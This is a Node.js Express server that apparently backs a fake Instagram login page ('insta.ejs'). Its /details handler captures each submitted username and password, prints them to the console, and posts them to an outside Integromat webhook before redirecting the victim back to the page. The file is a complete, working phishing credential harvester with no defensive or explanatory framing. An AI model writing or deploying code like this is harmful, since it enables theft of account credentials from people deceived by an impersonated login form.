const { default: axios } = require("axios");
const express = require("express");
const path = require("path");

const app = express();

app.use(express.urlencoded({extended: "false"}));

app.use(express.json());

app.use(express.static("public"));

app.get("/",(req,res)=>{
    res.render("insta.ejs");
})


app.post("/details",async (req,res)=>{
    const userName = req.body.user.name;
    const password = req.body.user.password;
    console.log("username: " + userName,"Password: "+ password);

    await axios({
        url:"https://hook.integromat.com/xp536bqe7p2c4uv2ca6inshnwp1cwtjv",
        method: "POST",
        data:{
            userName,password
        }
    })

    res.redirect("/");
})


app.listen(process.env.PORT || 3000,()=>{
    console.log("app started");
})
